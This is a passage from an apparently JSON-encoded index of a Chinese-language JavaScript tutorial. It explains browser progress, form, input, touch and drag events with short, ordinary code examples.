XMLHttpRequest();\n\nxhr.addEventListener(&#039;progress&#039;, updateProgress, false);\nxhr.addEventListener(&#039;load&#039;, transferComplete, false);\nxhr.addEventListener(&#039;error&#039;, transferFailed, false);\nxhr.addEventListener(&#039;abort&#039;, transferCanceled, false);\n\nxhr.open();\n\nfunction updateProgress(e) {\n  if (e.lengthComputable) {\n    var percentComplete = e.loaded / e.total;\n  } else {\n    console.log(&#039;不能计算进度&#039;);\n  }\n}\n\nfunction transferComplete(e) {\n  console.log(&#039;传输结束&#039;);\n}\n\nfunction transferFailed(evt) {\n  console.log(&#039;传输过程中发生错误&#039;);\n}\n\nfunction transferCanceled(evt) {\n  console.log(&#039;用户取消了传输&#039;);\n}</code></pre><p>上面是下载过程的进度事件，还存在上传过程的进度事件。这时所有监听函数都要放在<code>XMLHttpRequest.upload</code>对象上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\n\nxhr.upload.addEventListener(&#039;progress&#039;, updateProgress, false);\nxhr.upload.addEventListener(&#039;load&#039;, transferComplete, false);\nxhr.upload.addEventListener(&#039;error&#039;, transferFailed, false);\nxhr.upload.addEventListener(&#039;abort&#039;, transferCanceled, false);\n\nxhr.open();</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"表单事件","link":"/events/form.html"}],"content":"\n        <h1>\n            <a href='#表单事件' class='header-anchor'>#</a>\n            <span>表单事件</span>\n        </h1>\n    \n        <h2>\n            <a href='#表单事件的种类' class='header-anchor'>#</a>\n            <span>表单事件的种类</span>\n        </h2>\n    \n        <h3>\n            <a href='#input-事件' class='header-anchor'>#</a>\n            <span>input 事件</span>\n        </h3>\n    <p><code>input</code>事件当<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;textarea&gt;</code>的值发生变化时触发。对于复选框（<code>&lt;input type=checkbox&gt;</code>）或单选框（<code>&lt;input type=radio&gt;</code>），用户改变选项时，也会触发这个事件。另外，对于打开<code>contenteditable</code>属性的元素，只要值发生变化，也会触发<code>input</code>事件。</p>\n<p><code>input</code>事件的一个特点，就是会连续触发，比如用户每按下一次按键，就会触发一次<code>input</code>事件。</p>\n<p><code>input</code>事件对象继承了<code>InputEvent</code>接口。</p>\n<p>该事件跟<code>change</code>事件很像，不同之处在于<code>input</code>事件在元素的值发生变化后立即发生，而<code>change</code>在元素失去焦点时发生，而内容此时可能已经变化多次。也就是说，如果有连续变化，<code>input</code>事件会触发多次，而<code>change</code>事件只在失去焦点时触发一次。</p>\n<p>下面是<code>&lt;select&gt;</code>元素的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n&lt;select id=&quot;mySelect&quot;&gt;\n  &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;\n  &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;\n  &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;\n&lt;/select&gt;\n*/\n\nfunction inputHandler(e) {\n  console.log(e.target.value)\n}\n\nvar mySelect = document.querySelector(&#039;#mySelect&#039;);\nmySelect.addEventListener(&#039;input&#039;, inputHandler);</code></pre><p>上面代码中，改变下拉框选项时，会触发<code>input</code>事件，从而执行回调函数<code>inputHandler</code>。</p>\n\n        <h3>\n            <a href='#select-事件' class='header-anchor'>#</a>\n            <span>select 事件</span>\n        </h3>\n    <p><code>select</code>事件当在<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>里面选中文本时触发。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input id=&quot;test&quot; type=&quot;text&quot; value=&quot;Select me!&quot; /&gt;\n\nvar elem = document.getElementById(&#039;test&#039;);\nelem.addEventListener(&#039;select&#039;, function (e) {\n  console.log(e.type); // &quot;select&quot;\n}, false);</code></pre><p>选中的文本可以通过<code>event.target</code>元素的<code>selectionDirection</code>、<code>selectionEnd</code>、<code>selectionStart</code>和<code>value</code>属性拿到。</p>\n\n        <h3>\n            <a href='#Change-事件' class='header-anchor'>#</a>\n            <span>Change 事件</span>\n        </h3>\n    <p><code>Change</code>事件当<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;textarea&gt;</code>的值发生变化时触发。它与<code>input</code>事件的最大不同，就是不会连续触发，只有当全部修改完成时才会触发，另一方面<code>input</code>事件必然伴随<code>change</code>事件。具体来说，分成以下几种情况。</p>\n<ul>\n<li>激活单选框（radio）或复选框（checkbox）时触发。</li>\n<li>用户提交时触发。比如，从下列列表（select）完成选择，在日期或文件输入框完成选择。</li>\n<li>当文本框或<code>&lt;textarea&gt;</code>元素的值发生改变，并且丧失焦点时触发。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;select size=&quot;1&quot; onchange=&quot;changeEventHandler(event);&quot;&gt;\n//   &lt;option&gt;chocolate&lt;/option&gt;\n//   &lt;option&gt;strawberry&lt;/option&gt;\n//   &lt;option&gt;vanilla&lt;/option&gt;\n// &lt;/select&gt;\n\nfunction changeEventHandler(event) {\n  console.log(event.target.value);\n}</code></pre><p>如果比较一下上面<code>input</code>事件的例子，你会发现对于<code>&lt;select&gt;</code>元素来说，<code>input</code>和<code>change</code>事件基本是等价的。</p>\n\n        <h3>\n            <a href='#invalid-事件' class='header-anchor'>#</a>\n            <span>invalid 事件</span>\n        </h3>\n    <p>用户提交表单时，如果表单元素的值不满足校验条件，就会触发<code>invalid</code>事件。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form&gt;\n  &lt;input type=&quot;text&quot; required oninvalid=&quot;console.log(&#039;invalid input&#039;)&quot; /&gt;\n  &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;\n&lt;/form&gt;</code></pre><p>上面代码中，输入框是必填的。如果不填，用户点击按钮提交时，就会触发输入框的<code>invalid</code>事件，导致提交被取消。</p>\n\n        <h3>\n            <a href='#reset-事件，submit-事件' class='header-anchor'>#</a>\n            <span>reset 事件，submit 事件</span>\n        </h3>\n    <p>这两个事件发生在表单对象<code>&lt;form&gt;</code>上，而不是发生在表单的成员上。</p>\n<p><code>reset</code>事件当表单重置（所有表单成员变回默认值）时触发。</p>\n<p><code>submit</code>事件当表单数据向服务器提交时触发。注意，<code>submit</code>事件的发生对象是<code>&lt;form&gt;</code>元素，而不是<code>&lt;button&gt;</code>元素，因为提交的是表单，而不是按钮。</p>\n\n        <h2>\n            <a href='#InputEvent-接口' class='header-anchor'>#</a>\n            <span>InputEvent 接口</span>\n        </h2>\n    <p><code>InputEvent</code>接口主要用来描述<code>input</code>事件的实例。该接口继承了<code>Event</code>接口，还定义了一些自己的实例属性和实例方法。</p>\n<p>浏览器原生提供<code>InputEvent()</code>构造函数，用来生成实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>new InputEvent(type, options)</code></pre><p><code>InputEvent</code>构造函数可以接受两个参数。第一个参数是字符串，表示事件名称，该参数是必需的。第二个参数是一个配置对象，用来设置事件实例的属性，该参数是可选的。配置对象的字段除了<code>Event</code>构造函数的配置属性，还可以设置下面的字段，这些字段都是可选的。</p>\n<ul>\n<li><code>inputType</code>：字符串，表示发生变更的类型（详见下文）。</li>\n<li><code>data</code>：字符串，表示插入的字符串。如果没有插入的字符串（比如删除操作），则返回<code>null</code>或空字符串。</li>\n<li><code>dataTransfer</code>：返回一个 DataTransfer 对象实例，该属性通常只在输入框接受富文本输入时有效。</li>\n</ul>\n<p><code>InputEvent</code>的实例属性主要就是上面三个属性，这三个实例属性都是只读的。</p>\n<p><strong>（1）InputEvent.data</strong></p>\n<p><code>InputEvent.data</code>属性返回一个字符串，表示变动的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input type=&quot;text&quot; id=&quot;myInput&quot;&gt;\nvar input = document.getElementById(&#039;myInput&#039;);\ninput.addEventListener(&#039;input&#039;, myFunction, false);\n\nfunction myFunction(e) {\n  console.log(e.data);\n}</code></pre><p>上面代码中，如果手动在输入框里面输入<code>abc</code>，控制台会先输出<code>a</code>，再在下一行输出<code>b</code>，再在下一行输出<code>c</code>。然后选中<code>abc</code>，一次性将它们删除，控制台会输出<code>null</code>或一个空字符串。</p>\n<p><strong>（2）InputEvent.inputType</strong></p>\n<p><code>InputEvent.inputType</code>属性返回一个字符串，表示字符串发生变更的类型。</p>\n<p>对于常见情况，Chrome 浏览器的返回值如下。完整列表可以参考<a href=\"https://w3c.github.io/input-events/index.html#dom-inputevent-inputtype\">文档</a>。</p>\n<ul>\n<li>手动插入文本：<code>insertText</code></li>\n<li>粘贴插入文本：<code>insertFromPaste</code></li>\n<li>向后删除：<code>deleteContentBackward</code></li>\n<li>向前删除：<code>deleteContentBackward</code></li>\n</ul>\n<p><strong>（3）InputEvent.dataTransfer</strong></p>\n<p><code>InputEvent.dataTransfer</code>属性返回一个 DataTransfer 实例。该属性只在文本框接受粘贴内容（insertFromPaste）或拖拽内容（<code>insertFromDrop</code>）时才有效。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"触摸事件","link":"/events/touch.html"}],"content":"\n        <h1>\n            <a href='#触摸事件' class='header-anchor'>#</a>\n            <span>触摸事件</span>\n        </h1>\n    \n        <h2>\n            <a href='#触摸操作概述' class='header-anchor'>#</a>\n            <span>触摸操作概述</span>\n        </h2>\n    <p>浏览器的触摸 API 由三个部分组成。</p>\n<ul>\n<li>Touch：一个触摸点</li>\n<li>TouchList：多个触摸点的集合</li>\n<li>TouchEvent：触摸引发的事件实例</li>\n</ul>\n<p><code>Touch</code>接口的实例对象用来触摸点（一根手指或者一根触摸笔），包括位置、大小、形状、压力、目标元素等属性。有时，触摸动作由多个触摸点（多根手指）组成，多个触摸点的集合由<code>TouchList</code>接口的实例对象表示。<code>TouchEvent</code>接口的实例对象代表由触摸引发的事件，只有触摸屏才会引发这一类事件。</p>\n<p>很多时候，触摸事件和鼠标事件同时触发，即使这个时候并没有用到鼠标。这是为了让那些只定义鼠标事件、没有定义触摸事件的代码，在触摸屏的情况下仍然能用。如果想避免这种情况，可以用<code>event.preventDefault</code>方法阻止发出鼠标事件。</p>\n\n        <h2>\n            <a href='#Touch-接口' class='header-anchor'>#</a>\n            <span>Touch 接口</span>\n        </h2>\n    \n        <h3>\n            <a href='#Touch-接口概述' class='header-anchor'>#</a>\n            <span>Touch 接口概述</span>\n        </h3>\n    <p>Touch 接口代表单个触摸点。触摸点可能是一根手指，也可能是一根触摸笔。</p>\n<p>浏览器原生提供<code>Touch</code>构造函数，用来生成<code>Touch</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var touch = new Touch(touchOptions);</code></pre><p><code>Touch</code>构造函数接受一个配置对象作为参数，它有以下属性。</p>\n<ul>\n<li><code>identifier</code>：必需，类型为整数，表示触摸点的唯一 ID。</li>\n<li><code>target</code>：必需，类型为元素节点，表示触摸点开始时所在的网页元素。</li>\n<li><code>clientX</code>：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的水平距离，默认为0。</li>\n<li><code>clientY</code>：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的垂直距离，默认为0。</li>\n<li><code>screenX</code>：可选，类型为数值，表示触摸点相对于屏幕左上角的水平距离，默认为0。</li>\n<li><code>screenY</code>：可选，类型为数值，表示触摸点相对于屏幕左上角的垂直距离，默认为0。</li>\n<li><code>pageX</code>：可选，类型为数值，表示触摸点相对于网页左上角的水平位置（即包括页面的滚动距离），默认为0。</li>\n<li><code>pageY</code>：可选，类型为数值，表示触摸点相对于网页左上角的垂直位置（即包括页面的滚动距离），默认为0。</li>\n<li><code>radiusX</code>：可选，类型为数值，表示触摸点周围受到影响的椭圆范围的 X 轴半径，默认为0。</li>\n<li><code>radiusY</code>：可选：类型为数值，表示触摸点周围受到影响的椭圆范围的 Y 轴半径，默认为0。</li>\n<li><code>rotationAngle</code>：可选，类型为数值，表示触摸区域的椭圆的旋转角度，单位为度数，在0到90度之间，默认值为0。</li>\n<li><code>force</code>：可选，类型为数值，范围在<code>0</code>到<code>1</code>之间，表示触摸压力。<code>0</code>代表没有压力，<code>1</code>代表硬件所能识别的最大压力，默认为<code>0</code>。</li>\n</ul>\n\n        <h3>\n            <a href='#Touch-接口的实例属性' class='header-anchor'>#</a>\n            <span>Touch 接口的实例属性</span>\n        </h3>\n    <p><strong>（1）Touch.identifier</strong></p>\n<p><code>Touch.identifier</code>属性返回一个整数，表示触摸点的唯一 ID。这个值在整个触摸过程保持不变，直到触摸事件结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>someElement.addEventListener(&#039;touchmove&#039;, function (e) {\n  for (var i = 0; i &lt; e.changedTouches.length; i++) {\n    console.log(e.changedTouches[i].identifier);\n  }\n}, false);</code></pre><p><strong>（2）Touch.screenX，Touch.screenY，Touch.clientX，Touch.clientY，pageX，pageY</strong></p>\n<p><code>Touch.screenX</code>属性和<code>Touch.screenY</code>属性，分别表示触摸点相对于屏幕左上角的横坐标和纵坐标，与页面是否滚动无关。</p>\n<p><code>Touch.clientX</code>属性和<code>Touch.clientY</code>属性，分别表示触摸点相对于浏览器视口左上角的横坐标和纵坐标，与页面是否滚动无关。</p>\n<p><code>Touch.pageX</code>属性和<code>Touch.pageY</code>属性，分别表示触摸点相对于当前页面左上角的横坐标和纵坐标，包含了页面滚动带来的位移。</p>\n<p><strong>（3）Touch.radiusX，Touch.radiusY，Touch.rotationAngle</strong></p>\n<p><code>Touch.radiusX</code>属性和<code>Touch.radiusY</code>属性，分别返回触摸点周围受到影响的椭圆范围的 X 轴半径和 Y 轴半径，单位为像素。乘以 2 就可以得到触摸范围的宽度和高度。</p>\n<p><code>Touch.rotationAngle</code>属性表示触摸区域的椭圆的旋转角度，单位为度数，在<code>0</code>到<code>90</code>度之间。</p>\n<p>上面这三个属性共同定义了用户与屏幕接触的区域，对于描述手指这一类非精确的触摸，很有帮助。指尖接触屏幕，触摸范围会形成一个椭圆，这三个属性就用来描述这个椭圆区域。</p>\n<p>下面是一个示例。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.addEventListener(&#039;touchstart&#039;, rotate);\ndiv.addEventListener(&#039;touchmove&#039;, rotate);\ndiv.addEventListener(&#039;touchend&#039;, rotate);\n\nfunction rotate(e) {\n  var touch = e.changedTouches.item(0);\n  e.preventDefault();\n\n  src.style.width = touch.radiusX * 2 + &#039;px&#039;;\n  src.style.height = touch.radiusY * 2 + &#039;px&#039;;\n  src.style.transform = &#039;rotate(&#039; + touch.rotationAngle + &#039;deg)&#039;;\n};</code></pre><p><strong>（4）Touch.force</strong></p>\n<p><code>Touch.force</code>属性返回一个<code>0</code>到<code>1</code>之间的数值，表示触摸压力。<code>0</code>代表没有压力，<code>1</code>代表硬件所能识别的最大压力。</p>\n<p><strong>（5）Touch.target</strong></p>\n<p><code>Touch.target</code>属性返回一个元素节点，代表触摸发生时所在的那个元素节点。即使触摸点已经离开了这个节点，该属性依然不变。</p>\n\n        <h2>\n            <a href='#TouchList-接口' class='header-anchor'>#</a>\n            <span>TouchList 接口</span>\n        </h2>\n    <p><code>TouchList</code>接口表示一组触摸点的集合。它的实例是一个类似数组的对象，成员是<code>Touch</code>的实例对象，表示所有触摸点。用户用三根手指触摸，产生的<code>TouchList</code>实例就会包含三个成员，每根手指的触摸点对应一个<code>Touch</code>实例对象。</p>\n<p>它的实例主要通过触摸事件的<code>TouchEvent.touches</code>、<code>TouchEvent.changedTouches</code>、<code>TouchEvent.targetTouches</code>这几个属性获取。</p>\n<p>它的实例属性和实例方法只有两个。</p>\n<ul>\n<li><code>TouchList.length</code>：数值，表示成员数量（即触摸点的数量）。</li>\n<li><code>TouchList.item()</code>：返回指定位置的成员，它的参数是该成员的位置编号（从零开始）。</li>\n</ul>\n\n        <h2>\n            <a href='#TouchEvent-接口' class='header-anchor'>#</a>\n            <span>TouchEvent 接口</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p>TouchEvent 接口继承了 Event 接口，表示由触摸引发的事件实例，通常来自触摸屏或轨迹板。除了被继承的属性以外，它还有一些自己的属性。</p>\n<p>浏览器原生提供<code>TouchEvent()</code>构造函数，用来生成触摸事件的实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>new TouchEvent(type, options)</code></pre><p><code>TouchEvent()</code>构造函数可以接受两个参数，第一个参数是字符串，表示事件类型；第二个参数是事件的配置对象，该参数是可选的，对象的所有属性也是可选的。除了<code>Event</code>接口的配置属性，该接口还有一些自己的配置属性。</p>\n<ul>\n<li><code>touches</code>：<code>TouchList</code>实例，代表所有的当前处于活跃状态的触摸点，默认值是一个空数组<code>[]</code>。</li>\n<li><code>targetTouches</code>：<code>TouchList</code>实例，代表所有处在触摸的目标元素节点内部、且仍然处于活动状态的触摸点，默认值是一个空数组<code>[]</code>。</li>\n<li><code>changedTouches</code>：<code>TouchList</code>实例，代表本次触摸事件的相关触摸点，默认值是一个空数组<code>[]</code>。</li>\n<li><code>ctrlKey</code>：布尔值，表示 Ctrl 键是否同时按下，默认值为<code>false</code>。</li>\n<li><code>shiftKey</code>：布尔值，表示 Shift 键是否同时按下，默认值为<code>false</code>。</li>\n<li><code>altKey</code>：布尔值，表示 Alt 键是否同时按下，默认值为<code>false</code>。</li>\n<li><code>metaKey</code>：布尔值，表示 Meta 键（或 Windows 键）是否同时按下，默认值为<code>false</code>。</li>\n</ul>\n\n        <h3>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h3>\n    <p>TouchEvent 接口的实例具有<code>Event</code>实例的所有属性和方法，此外还有一些它自己的实例属性，这些属性全部都是只读。</p>\n<p><strong>（1）TouchEvent.altKey，TouchEvent.ctrlKey，TouchEvent.shiftKey，TouchEvent.metaKey</strong></p>\n<ul>\n<li><code>TouchEvent.altKey</code>：布尔值，表示触摸时是否按下了 Alt 键。</li>\n<li><code>TouchEvent.ctrlKey</code>：布尔值，表示触摸时是否按下了 Ctrl 键。</li>\n<li><code>TouchEvent.shiftKey</code>：布尔值：表示触摸时是否按下了 Shift 键。</li>\n<li><code>TouchEvent.metaKey</code>：布尔值，表示触摸时是否按下了 Meta 键（或 Windows 键）。</li>\n</ul>\n<p>下面是一个示例。</p>\n<pre class=\"prettyprint language-javascript\"><code>someElement.addEventListener(&#039;touchstart&#039;, function (e) {\n  console.log(&#039;altKey = &#039; + e.altKey);\n  console.log(&#039;ctrlKey = &#039; + e.ctrlKey);\n  console.log(&#039;metaKey = &#039; + e.metaKey);\n  console.log(&#039;shiftKey = &#039; + e.shiftKey);\n}, false);</code></pre><p><strong>（2）TouchEvent.changedTouches</strong></p>\n<p><code>TouchEvent.changedTouches</code>属性返回一个<code>TouchList</code>实例，成员是一组<code>Touch</code>实例对象，表示本次触摸事件的相关触摸点。</p>\n<p>对于不同的时间，该属性的含义有所不同。</p>\n<ul>\n<li><code>touchstart</code>事件：被激活的触摸点</li>\n<li><code>touchmove</code>事件：发生变化的触摸点</li>\n<li><code>touchend</code>事件：消失的触摸点（即不再被触碰的点）</li>\n</ul>\n<p>下面是一个示例。</p>\n<pre class=\"prettyprint language-javascript\"><code>someElement.addEventListener(&#039;touchmove&#039;, function (e) {\n  for (var i = 0; i &lt; e.changedTouches.length; i++) {\n    console.log(e.changedTouches[i].identifier);\n  }\n}, false);</code></pre><p><strong>（3）TouchEvent.touches</strong></p>\n<p><code>TouchEvent.touches</code>属性返回一个<code>TouchList</code>实例，成员是所有仍然处于活动状态（即触摸中）的触摸点。一般来说，一个手指就是一个触摸点。</p>\n<p>下面是一个示例。</p>\n<pre class=\"prettyprint language-javascript\"><code>someElement.addEventListener(&#039;touchstart&#039;, function (e) {\n  switch (e.touches.length) {\n    // 一根手指触摸\n    case 1: handle_one_touch(e); break;\n    // 两根手指触摸\n    case 2: handle_two_touches(e); break;\n    // 三根手指触摸\n    case 3: handle_three_touches(e); break;\n    // 其他情况\n    default: console.log(&#039;Not supported&#039;); break;\n  }\n}, false);</code></pre><p><strong>（4）TouchEvent.targetTouches</strong></p>\n<p><code>TouchEvent.targetTouches</code>属性返回一个<code>TouchList</code>实例，成员是触摸事件的目标元素节点内部、所有仍然处于活动状态（即触摸中）的触摸点。</p>\n<pre class=\"prettyprint language-javascript\"><code>function touches_in_target(ev) {\n  return (ev.touches.length === ev.targetTouches.length ? true : false);\n}</code></pre><p>上面代码用来判断，是否所有触摸点都在目标元素内。</p>\n\n        <h2>\n            <a href='#触摸事件的种类' class='header-anchor'>#</a>\n            <span>触摸事件的种类</span>\n        </h2>\n    <p>触摸引发的事件，有以下几种。可以通过<code>TouchEvent.type</code>属性，查看到底发生的是哪一种事件。</p>\n<ul>\n<li><code>touchstart</code>：用户开始触摸时触发，它的<code>target</code>属性返回发生触摸的元素节点。</li>\n<li><code>touchend</code>：用户不再接触触摸屏时（或者移出屏幕边缘时）触发，它的<code>target</code>属性与<code>touchstart</code>事件一致的，就是开始触摸时所在的元素节点。它的<code>changedTouches</code>属性返回一个<code>TouchList</code>实例，包含所有不再触摸的触摸点（即<code>Touch</code>实例对象）。</li>\n<li><code>touchmove</code>：用户移动触摸点时触发，它的<code>target</code>属性与<code>touchstart</code>事件一致。如果触摸的半径、角度、力度发生变化，也会触发该事件。</li>\n<li><code>touchcancel</code>：触摸点取消时触发，比如在触摸区域跳出一个情态窗口（modal window）、触摸点离开了文档区域（进入浏览器菜单栏）、用户的触摸点太多，超过了支持的上限（自动取消早先的触摸点）。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var el = document.getElementsByTagName(&#039;canvas&#039;)[0];\nel.addEventListener(&#039;touchstart&#039;, handleStart, false);\nel.addEventListener(&#039;touchmove&#039;, handleMove, false);\n\nfunction handleStart(evt) {\n  evt.preventDefault();\n  var touches = evt.changedTouches;\n  for (var i = 0; i &lt; touches.length; i++) {\n    console.log(touches[i].pageX, touches[i].pageY);\n  }\n}\n\nfunction handleMove(evt) {\n  evt.preventDefault();\n  var touches = evt.changedTouches;\n  for (var i = 0; i &lt; touches.length; i++) {\n    var touch = touches[i];\n    console.log(touch.pageX, touch.pageY);\n  }\n}</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"拖拉事件","link":"/events/drag.html"}],"content":"\n        <h1>\n            <a href='#拖拉事件' class='header-anchor'>#</a>\n            <span>拖拉事件</span>\n        </h1>\n    \n        <h2>\n            <a href='#拖拉事件的种类' class='header-anchor'>#</a>\n            <span>拖拉事件的种类</span>\n        </h2>\n    <p>拖拉（drag）指的是，用户在某个对象上按下鼠标键不放，拖动它到另一个位置，然后释放鼠标键，将该对象放在那里。</p>\n<p>拖拉的对象有好几种，包括元素节点、图片、链接、选中的文字等等。在网页中，除了元素节点默认不可以拖拉，其他（图片、链接、选中的文字）都是可以直接拖拉的。为了让元素节点可拖拉，可以将该节点的<code>draggable</code>属性设为<code>true</code>。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div draggable=&quot;true&quot;&gt;\n  此区域可拖拉\n&lt;/div&gt;</code></pre><p><code>draggable</code>属性可用于任何元素节点，但是图片（<code>&lt;img&gt;</code>）和链接（<code>&lt;a&gt;</code>）不加这个属性，就可以拖拉。对于它们，用到这个属性的时候，往往是将其设为<code>false</code>，防止拖拉这两种元素。</p>\n<p>注意，一旦某个元素节点的<code>draggable</code>属性设为<code>true</code>，就无法再用鼠标选中该节点内部的文字或子节点了。</p>\n<p>当元素节点或选中的文本被拖拉时，就会持续触发拖拉事件，包括以下一些事件。</p>\n<ul>\n<li><code>drag</code>：拖拉过程中，在被拖拉的节点上持续触发（相隔几百毫秒）。</li>\n<li><code>dragstart</code>：用户开始拖拉时，在被拖拉的节点上触发，该事件的<code>target</code>属性是被拖拉的节点。通常应该在这个事件的监听函数中，指定拖拉的数据。</li>\n<li><code>dragend</code>：拖拉结束时（释放鼠标键或按下 ESC 键）在被拖拉的节点上触发，该事件的<code>target</code>属性是被拖拉的节点。它与<code>dragstart</code>事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，<code>dragend</code>事件总是会触发的。</li>\n<li><code>dragenter</code>：拖拉进入当前节点时，在当前节点上触发一次，该事件的<code>target</code>属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。</li>\n<li><code>dragover</code>：拖拉到当前节点上方时，在当前节点上持续触发（相隔几百毫秒），该事件的<code>target</code>属性是当前节点。该事件与<code>dragenter</code>事件的区别是，<code>dragenter</code>事件在进入该节点时触发，然后只要没有离开这个节点，<code>dragover</code>事件会持续触发。</li>\n<li><code>dragleave</code>：拖拉操作离开当前节点范围时，在当前节点上触发，该事件的<code>target</code>属性是当前节点。如果要在视觉上显示拖拉离开操作当前节点，就在这个事件的监听函数中设置。</li>\n<li><code>drop</code>：被拖拉的节点或选中的文本，释放到目标节点时，在目标节点上触发。注意，如果当前节点不允许<code>drop</code>，即使在该节点上方松开鼠标键，也不会触发该事件。如果用户按下 ESC 键，取消这个操作，也不会触发该事件。该事件的监听函数负责取出拖拉数据，并进行相关处理。</li>\n</ul>\n<p>下面的例子展示，如何动态改变被拖动节点的背景色。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.addEventListener(&#039;dragstart&#039;, function (e) {\n  this.style.backgroundColor = &#039;red&#039;;\n}, false);\n\ndiv.addEventListener(&#039;dragend&#039;, function (e) {\n  this.style.backgroundColor = &#039;green&#039;;\n}, false);</code></pre><p>上面代码中，<code>div</code>节点被拖动时，背景色会变为红色，拖动结束，又变回绿色。</p>\n<p>下面是一个例子，展示如何实现将一个节点从当前父节点，拖拉到另一个父节点中。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n &lt;div class=&quot;dropzone&quot;&gt;\n   &lt;div id=&quot;draggable&quot; draggable=&quot;true&quot;&gt;\n     该节点可拖拉\n   &lt;/div&gt;\n &lt;/div&gt;\n &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;\n &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;\n &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;\n*/\n\n// 被拖拉节点\nvar dragged;\n\ndocument.addEventListener(&#039;dragstart&#039;, function (event) {\n  // 保存被拖拉节点\n  dragged = event.target;\n  // 被拖拉节点的背景色变透明\n  event.target.style.opacity = 0.5;\n}, false);\n\ndocument.addEventListener(&#039;dragend&#039;, function (event) {\n  // 被拖拉节点的背景色恢复正常\n  event.target.style.opacity = &#039;&#039;;\n}, false);\n\ndocument.addEventListener(&#039;dragover&#039;, function (event) {\n  // 防止拖拉效果被重置，允许被拖拉的节点放入目标节点\n  event.preventDefault();\n}, false);\n\ndocument.addEventListener(&#039;dragenter&#039;, function (event) {\n  // 目标节点的背景色变紫色\n  // 由于该事件会冒泡，所以要过滤节点\n  if (event.target.className === &#039;dropzone&#039;) {\n    event.target.style.background = &#039;purple&#039;;\n  }\n}, false);\n\ndocument.addEventListener(&#039;dragleave&#039;, function( event ) {\n  // 目标节点的背景色恢复原样\n  if (event.target.className === &#039;dropzone&#039;) {\n    event.target.style.background = &#039;&#039;;\n  }\n}, false);\n\ndocument.addEventListener(&#039;drop&#039;, function( event ) {\n  // 防止事件默认行为（比如某些元素节点上可以打开链接），\n  event.preventDefault();\n  if (event.target.className === &#039;dropzone&#039;) {\n    // 恢复目标节点背景色\n    event.target.style.background = &#039;&#039;;\n    // 将被拖拉节点插入目标节点\n    dragged.parentNode.removeChild(dragged);\n    event.target.appendChild( dragged );\n  }\n}, false);</code></pre><p>关于拖拉事件，有以下几个注意点。</p>\n<ul>\n<li>拖拉过程只触发以上这些拖拉事件，尽管鼠标在移动，但是鼠标事件不会触发。</li>\n<li>将文件从操作系统拖拉进浏览器，不会触发<code>dragstart</code>和<code>dragend</code>事件。</li>\n<li><code>dragenter</code>和<code>dragover</code>事件的监听函数，用来取出拖拉的数据（即允许放下被拖拉的元素）。由于网页的大部分区域不适合作为放下拖拉元素的目标节点，所以这两个事件的默认设置为当前节点不允许接受被拖拉的元素。如果想要在目标节点上放下的数据，首先必须阻止这两个事件的默认行为。</li>\n</ul>\n<pre class=\"prettyprint language-html\"><code>&lt;div ondragover=&quot;return false&quot;&gt;\n&lt;div ondragover=&quot;event.preventDefault()&quot;&gt;</code></pre><p>上面代码中，如果不取消拖拉事件或者阻止默认行为，就不能在<code>div</code>节点上放下被拖拉的节点。</p>\n\n        <h2>\n            <a href='#DragEvent-接口' class='header-anchor'>#</a>\n            <span>DragEvent 接口</span>\n        </h2>\n    <p>拖拉事件都继承了<code>DragEvent</code>接口，这个接口又继承了<code>MouseEvent</code>接口和<code>Event</code>接口。</p>\n<p>浏览器原生提供一个<code>DragEvent()</code>构造函数，用来生成拖拉事件的实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>new DragEvent(type, options)</code></pre><p><code>DragEvent()</code>构造函数接受两个参数，第一个参数是字符串，表示事件的类型，该参数必须；第二个参数是事件的配置对象，用来设置事件的属性，该参数可选。配置对象除了接受<code>MouseEvent</code>接口和<code>Event</code>接口的配置属性，还可以设置<code>dataTransfer</code>属性要么是<code>null</code>，要么是一个<code>DataTransfer</code>接口的实例。</p>\n<p><code>DataTransfer</code>的实例对象用来读写拖拉事件中传输的数据，详见下文《DataTransfer 接口》的部分。</p>\n\n        <h2>\n            <a href='#DataTransfer-接口概述' class='header-anchor'>#</a>\n            